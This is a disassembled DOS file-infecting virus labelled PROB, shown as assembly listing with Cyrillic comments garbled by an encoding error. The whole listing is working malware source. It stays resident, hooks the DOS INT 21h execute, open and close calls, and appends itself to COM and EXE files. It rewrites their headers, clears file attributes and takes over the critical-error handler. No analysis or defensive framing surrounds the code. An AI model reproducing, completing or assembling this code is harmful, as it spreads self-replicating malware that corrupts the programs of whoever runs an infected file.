
PAGE  59,132

;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;€€                                                                      €€
;€€                             PROB                                     €€
;€€                                                                      €€
;€€      Created:   1-Jan-80                                             €€
;€€      Version:                                                        €€
;€€      Passes:    5          Analysis Options on: ABCDEFPX             €€
;€€                                                                      €€
;€€                                                                      €€
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€

data_1e         equ     0                       ; (6B7E:0000=0)
data_2e         equ     2                       ; (6B7E:0002=0)
data_4e         equ     0F1h                    ; (6B7E:00F1=0)
data_17e        equ     499h                    ; (6C11:0499=0)
data_18e        equ     49Bh                    ; (6C11:049B=0)
data_19e        equ     49Dh                    ; (6C11:049D=0)
data_20e        equ     49Fh                    ; (6C11:049F=0)
data_21e        equ     4B8h                    ; (6C11:04B8=0)

;-------------------------------------------------------------- seg_a  ----

seg_a           segment para public
                assume cs:seg_a , ds:seg_a , ss:stack_seg_c

                db      256 dup (0)
                db      8Ch, 0C8h, 8Eh, 0D8h, 0BAh, 10h
                db      1, 0B4h, 9, 0CDh, 21h, 0B8h
                db      0, 4Ch, 0CDh
                db      '!This is a test', 0Ah, 0Dh, '$'
                db      1807 dup (0)

seg_a           ends



;-------------------------------------------------------------- seg_b  ----

seg_b           segment para public
                assume cs:seg_b , ds:seg_b , ss:stack_seg_c

                db      241 dup (0)
                db      4Fh, 4Dh
                db      9 dup (20h)
                db      0, 0, 0, 0

;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;
;                       Program Entry Point
;
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€


prob            proc    far

start:
                jmp     short loc_3             ; (0137)
data_10         dw      5A4Dh
                db      21h, 1, 6, 0, 0, 0
                db      20h, 0, 0, 0, 0FFh, 0FFh
data_11         dw      0
data_12         dw      0
                db      0BBh, 0DDh
data_13         dd      00100h
                db      'COMMAND.COM'
                db      0

prob            endp

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_1           proc    near                    ; è∞Æ¢•∞ø¢† §†´® • EXE
                cmp     cs:data_10,4D5Ah        ; (6C11:0102=5A4Dh)
                je      loc_ret_2               ; Jump if equal
                cmp     cs:data_10,5A4Dh        ; (6C11:0102=5A4Dh)

loc_ret_2:
                retn
sub_1           endp

loc_3:
                mov     cs:data_19e,ds          ; (6C11:049D=0)
                push    ax
                mov     ax,0EC59h               ; è∞Æ¢•∞ø¢† §†´® • ®≠±≤†´®∞†≠
                int     21h                     ; DOS Services  ah=function ECh
                cmp     bp,ax                   ; Ä™Æ AX<>BP ≠• • ®≠±≤†´®∞†≠
                jne     loc_6
                push    cs
                pop     ds
loc_4:
                pop     ax
                mov     es,cs:data_19e          ; (6C11:049D=0)
                call    sub_1                   ; (COM/EXE)?
                jz      loc_5                   ; Jump if zero
                mov     cx,0Dh                  ; Ç∫ß±≤†≠Æ¢ø¢† COM
                mov     si,102h
                push    es
                mov     di,100h
                push    di                      ; è∞•¨•±≤¢† Ø∫∞¢®≤• 13 °†©≤†
                rep     movsb                   ; Rep when cx >0 Mov [si] to es:[di]
                push    es
                pop     ds                      ; è∞•µÆ§ ™∫¨ Ø∞Æ£∞†¨†≤†
                retf                            ; Return far
loc_5:
                mov     si,es                   ; Ç∫ß±≤†≠Æ¢ø¢† EXE
                add     si,10h
                add     word ptr cs:data_13+2,si; íÆ¢† • Æ≤¨•±≤¢†≠•≤Æ ≠† CS
                add     si,cs:data_11           ; íÆ¢† • Æ≤¨•±≤¢†≠•≤Æ ≠† SS
                mov     di,cs:data_12           ; íÆ¢† • Æ≤¨•±≤¢†≠•≤Æ ≠† SP
                push    es
                pop     ds
                cli                             ; Disable interrupts
                mov     ss,si
                mov     sp,di
                sti                             ; Enable interrupts
                jmp     cs:data_13              ; è∞•µÆ§ ™∫¨ Ø∞Æ£∞†¨†≤†
loc_6:
                mov     ax,3521h
                int     21h                     ; DOS Services  ah=function 35h
                                                ;  get intrpt vector al in es:bx
                mov     dx,bx
                push    es
                pop     ds
                mov     ax,25ECh                ; è∞•¨•±≤¢† INT 21H ≠† INT ECH
                int     21h                     ; DOS Services  ah=function 25h
                                                ;  set intrpt vector al to ds:dx
                mov     ax,cs:data_19e          ; (6C11:049D=0)
                mov     es,ax
                dec     ax
                mov     ds,ax
                mov     bx,word ptr ds:data_2e+1        ; (6B7E:0003=0)
                sub     bx,65h
                add     ax,bx
                mov     es:data_2e,ax           ; (6B7E:0002=0)
                mov     ah,4Ah                  ; 'J'
                int     0ECh
                mov     bx,64h
                mov     ah,48h                  ; 'H'
                int     0ECh
                sub     ax,10h
                mov     es,ax
                mov     byte ptr ds:data_1e,5Ah ; (6B7E:0000=0) 'Z'
                push    cs
                pop     ds
                mov     si,100h
                mov     di,si
                mov     cx,39Fh
                nop                             ; è∞•¨•±≤¢† ±• ¢∫¢ ¢®±Æ™®≤• †§∞•±®
                rep     movsb                   ; Rep when cx >0 Mov [si] to es:[di]
                mov     di,1D0h
                push    es
                push    di
                retf                            ; Return far
                mov     word ptr es:data_4e,70h ; (6B7E:00F1=0)
                mov     ax,3521h  ;(??) í†ß® ®≠±≤∞≥™∂®ø ¨Æ¶• §† ±• ÆØ≤®¨®ß®∞†
                int     0ECh
                mov     cs:data_15,bx           ; (6C11:0216=12E4h)
                mov     cs:data_16,es           ; (6C11:0218=12Eh)
                mov     ah,25h                  ; '%'
                mov     dx,201h
                push    cs
                pop     ds
                int     0ECh                    ; è∞•µ¢†π† ¢•™≤Æ∞† ≠† INT 21H
                push    cs
                pop     es
                mov     di,49Fh
                mov     cx,19h
                mov     al,0                    ; ç≥´®∞† 19h °†©≤† ±´•§ ™∞†ø
                rep     stosb                   ; Rep when cx >0 Store al to es:[di]
                jmp     loc_4                   ; Ç∫ß±≤†≠Æ¢ø¢† Ø∞Æ£∞†¨†≤†
loc_7:
                mov     bp,ax                   ; íÆ¢† • ¥≥≠™∂®ø ECH
                iret                            ; Interrupt return
                cmp     ax,0EC59h               ; ÇïéÑçÄ íéóäÄ çÄ INT 21H
                je      loc_7                   ; Jump if equal
                cmp     ax,4B00h
                je      loc_9                   ; Jump if equal
                cmp     ah,3Dh                  ; '='
                je      loc_11                  ; Jump if equal
                cmp     ah,3Eh                  ; '>'
                je      loc_13                  ; Jump if equal
loc_8:
                jmp     far ptr loc_1           ;*(012E:12E4)
loc_9:
                call    sub_2                   ; (028B)
                jmp     short loc_8             ; (0215)
loc_10:
                pop     cx
                jmp     short loc_8             ; (0215)
loc_11:
                push    cx
                call    sub_6                   ; (040E)
                jc      loc_10                  ; Jump if carry Set
                cmp     cx,20h
                pop     cx
                jnz     loc_8                   ; Jump if not zero
                mov     al,2
                pushf                           ; Push flags
                call    dword ptr cs:[216h]     ; (6C11:0216=12E4h)
                jc      loc_ret_12              ; Jump if carry Set
                push    ax
                push    bx
                mov     bx,ax
                mov     al,cs:data_21e          ; (6C11:04B8=0)
                mov     cs:data_20e[bx],al      ; (6C11:049F=0)
                pop     bx
                pop     ax

loc_ret_12:
                retf    2                       ; Return far
loc_13:
                cmp     byte ptr cs:data_20e[bx],0      ; (6C11:049F=0)
                je      loc_8                   ; Jump if equal
                push    ax
                mov     al,cs:data_20e[bx]      ; (6C11:049F=0)
                mov     cs:data_21e,al          ; (6C11:04B8=0)
                mov     byte ptr cs:data_20e[bx],0      ; (6C11:049F=0)
                mov     ah,45h                  ; 'E'
                int     0ECh
                mov     cs:data_19e,ax          ; (6C11:049D=0)
                pop     ax
                jc      loc_8                   ; Jump if carry Set
                pushf                           ; Push flags
                call    dword ptr cs:[216h]     ; (6C11:0216=12E4h)
                jc      loc_ret_12              ; Jump if carry Set
                push    bx
                mov     bx,cs:data_19e          ; (6C11:049D=0)
                push    ds
                call    sub_3                   ; (02BB)
                call    sub_4                   ; (02DC)
                call    sub_5                   ; (03FA)
                pop     ds
                pop     bx
                clc                             ; Clear carry flag
                retf    2                       ; Return far

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_2           proc    near
                push    ax
                push    bx
                push    cx
                call    sub_6                   ; (040E)
                jc      loc_16                  ; Ä™Æ ≠• • ®ßØ∫´≠®¨ ®ßµÆ§
                push    cx
                push    ds
                call    sub_3                   ; è∞•≠†±Æ∑¢† INT 24H
                pop     ds
                mov     ax,4301h
                xor     cx,cx                   ; Zero register
                int     0ECh                    ; è∞Æ¨•≠ø †≤∞®°≥≤®≤•
                jc      loc_14                  ; Jump if carry Set
                mov     ax,3D02h                ; é≤¢†∞ø £Æ ß† ∑•≤•≠•
                int     0ECh
                mov     bx,ax
loc_14:
                pop     cx
                jc      loc_15                  ; Ä™Æ ®¨† £∞•∏™† ®ßµÆ§
                call    sub_4                   ; (02DC)
                mov     ax,4301h
                int     0ECh
loc_15:
                call    sub_5                   ; (03FA)
loc_16:
                pop     cx
                pop     bx
                pop     ax
                retn
sub_2           endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_3           proc    near                   ; è∞•≠†±Æ∑¢† INT 24H
                push    ax
                push    dx
                push    bx
                push    es
                mov     ax,3524h
                int     0ECh
                mov     cs:data_17e,bx          ; (6C11:0499=0)
                mov     cs:data_18e,es          ; (6C11:049B=0)
                pop     es
                pop     bx
                push    cs
                pop     ds
                mov     dx,469h
                mov     ah,25h
                int     0ECh                     ; è∞•≠†±Æ∑¢† INT 24H
                pop     dx
                pop     ax
                retn
sub_3           endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_4           proc    near
                push    ax
                push    cx
                push    dx
                push    si
                push    di
                push    ds
                mov     di,102h
                mov     cx,0FFFFh
                mov     dx,0FFFAh
                mov     ax,4202h
                int     0ECh                  ; è∞•¨•±≤¢† ≥™†ß†≤•´ø ¢ ™∞†ø
                mov     ah,3Fh                ; '?'
                mov     cx,6
                push    cs
                pop     ds
                mov     dx,di
                int     0ECh                    ; ó•≤• 6 °†©≤†
                jc      loc_17                  ; Jump if carry Set
                cmp     word ptr cs:[di],4E41h  ; è∞Æ¢•∞ø¢† §†´® • ß†∞†ß•≠
                je      loc_17                  ; Jump if equal
                xor     cx,cx
                xor     dx,dx
                mov     ax,4200h
                int     0ECh                    ; è∞•¨•±≤¢† FP ¢ ≠†∑†´Æ≤Æ
                mov     ah,3Fh                  ; èÆ¨•±≤•¢† Ø∫∞¢®≤• 18h °†©≤†
                mov     cx,18h                  ; Æ≤ CS:100
                mov     dx,di
                int     0ECh                    ; ó•≤• Ø∫∞¢®≤• 18h °†©≤†
                jnc     loc_18                  ; Jump if carry=0
loc_17:
                jmp     loc_27                  ; (03E6)
loc_18:
                xor     cx,cx                   ; Zero register
                xor     dx,dx                   ; Zero register
                cmp     byte ptr cs:data_21e,2  ; (6C11:04B8=0)
                jne     loc_19                  ; Jump if not equal
                cmp     word ptr [di+1],4000h
                ja      loc_17                  ; Jump if above
                dec     cx
                mov     dx,0C0h
                sub     dx,499h
loc_19:
                mov     ax,4202h                ; è∞•¨•±≤¢† FP ¢ ™∞†ø ≠† ¥†®´†
loc_20:
                int     0ECh
                test    ax,0Fh
                jz      loc_21                  ; Jump if zero
                mov     cx,dx                   ; á†™∞∫£´ø §Æ 16
                mov     dx,ax
                add     dx,10h
                adc     cx,0
                and     dl,0F0h
                mov     ax,4200h                ; è∞•¨•±≤¢† ≠† ß†™∞∫£´•≠®ø
                jmp     short loc_20            ; (0339)
loc_21:
                call    sub_1                   ; (0126)
                jz      loc_23                  ; î†®´∫≤ • EXE
                or      dx,dx                   ; Zero ?
                jnz     loc_17                  ; Jump if not zero
                cmp     ax,400h
                jae     loc_22                  ; Jump if above or =
                jmp     loc_27                  ; (03E6)
loc_22:
                cmp     ax,0FA00h
                ja      loc_27                  ; Jump if above
loc_23:
                mov     cl,4
                shr     ax,cl                   ; Shift w/zeros fill
                mov     si,ax
                mov     cl,0Ch
                shl     dx,cl                   ; Shift w/zeros fill
                add     si,dx                 ; èÆ´≥∑†¢† §∫´¶®≠†≤† ¢ Ø†∞†£∞†¥®
                mov     ah,40h                ; á†Ø®±¢† 399h °†©≤†
                mov     dx,100h
                mov     cx,399h
                nop
                int     0ECh
                jc      loc_27                  ; Jump if carry Set
                call    sub_1
                jnz     loc_25                  ; Jump if not zero
                sub     si,10h
                sub     si,cs:[di+8]              ; äÆ∞®£®∞† Ø∞•¥®™±†
                mov     word ptr cs:[di+14h],100h
                mov     cs:[di+16h],si
                mov     word ptr cs:[di+10h],400h
                add     si,44h
                nop
                mov     cs:[di+0Eh],si
                mov     ax,4202h
                xor     cx,cx                   ; Zero register
                xor     dx,dx                   ; Zero register
                int     0ECh                    ; Çß•¨† §∫´¶®≠†≤†
                mov     cx,200h
                div     cx                      ; ax,dx rem=dx:ax/reg
                or      dx,dx                   ; Zero ?
                jz      loc_24                  ; Jump if zero
                inc     ax
loc_24:
                mov     cs:[di+2],dx            ;è∞Æ¨•≠ø §∫´¶®≠†≤† ¢ Ø∞•¥®™±†
                mov     cs:[di+4],ax
                jmp     short loc_26            ; (03D4)
loc_25:
                push    si
                push    di
                push    es
                push    cs
                pop     es
                mov     si,46Ch
                mov     cx,0Bh
                rep     movsb                   ; Rep when cx >0 Mov [si] to es:[di]
                pop     es
                pop     di
                pop     word ptr [di+0Bh]
loc_26:
                mov     ax,4200h                ; è∞•¨•±≤¢† FP ¢ ≠†∑†´Æ≤Æ
                xor     cx,cx                   ; Zero register
                xor     dx,dx                   ; Zero register
                int     0ECh
                mov     ah,40h                  ; á†Ø®±¢† Ø∫∞¢®≤• 16h °†©≤†
                mov     cx,18h
                mov     dx,di
                int     0ECh
loc_27:                                         ; Çß•¨† §†≤†≤† ¨≥ ® ø ß†Ø®±¢†
                mov     ax,5700h
                int     0ECh
                mov     al,1
                int     0ECh
                mov     ah,3Eh                  ; á†≤¢†∞ø ¥†®´†
                int     0ECh
                pop     ds
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     ax
                retn
sub_4           endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_5           proc    near                    ; Ç∫ß±≤†≠Æ¢ø¢† INT 24H
                push    ax
                push    dx
                push    ds
                mov     ax,2524h
                mov     dx,cs:data_17e          ; (6C11:0499=0)
                mov     ds,cs:data_18e          ; (6C11:049B=0)
                pop     ds
                pop     dx
                pop     ax
                retn
sub_5           endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_6           proc    near                   ; á†Ø†ß¢† ∞•£®±≤∞®≤•
                push    ax
                push    es
                push    di
                push    bx
                mov     di,dx
                push    ds
                pop     es
                mov     al,0
                mov     cx,40h                  ; í∫∞±® ™∞†ø≤ ≠† ®¨•≤Æ ≠† ¥†®´†
                repne   scasb                   ; Rep zf=0+cx >0 Scan es:[di] for al
                mov     ax,[di-3]
                mov     cx,[di-5]
                and     ax,5F5Fh
                and     ch,5Fh
                cmp     ax,4D4Fh                ;(COM)?
                jne     loc_29
                cmp     cx,432Eh
                je      $+10h                   ; Jump if equal
loc_28:
                stc                             ; Set carry flag
                jmp     short $+2Fh
loc_29:
                cmp     ax,4558h
                jne     loc_28                  ; Jump if not equal
                cmp     cx,452Eh
sub_6           endp


seg_b           ends



;--------------------------------------------------------- stack_seg_c  ---

stack_seg_c     segment para stack

                db      75h, 0F2h, 0B9h, 7, 0, 0BBh
                db      0FFh, 0FFh, 43h, 8Ah, 41h, 0F4h
                db      24h, 5Fh, 2Eh, 3Ah, 87h, 1Ah
                db      1, 0E1h, 0F3h, 0B0h, 1, 75h
                db      2, 0B0h, 2, 2Eh, 0A2h, 0B8h
                db      4, 0B8h, 0, 43h, 0CDh, 0ECh
                db      5Bh, 5Fh, 7, 58h, 0C3h, 0B0h
                db      3, 0CFh, 50h, 8Ch, 0C8h, 1
                db      6, 0Bh, 1, 58h, 0EAh, 0
                db      1
                db      ' Dark Lord, I summon thee!'
                db      0
                db      4Dh, 41h, 4Eh, 4Fh, 57h, 41h
                db      52h
                db      935 dup (0)

stack_seg_c     ends



                end     start
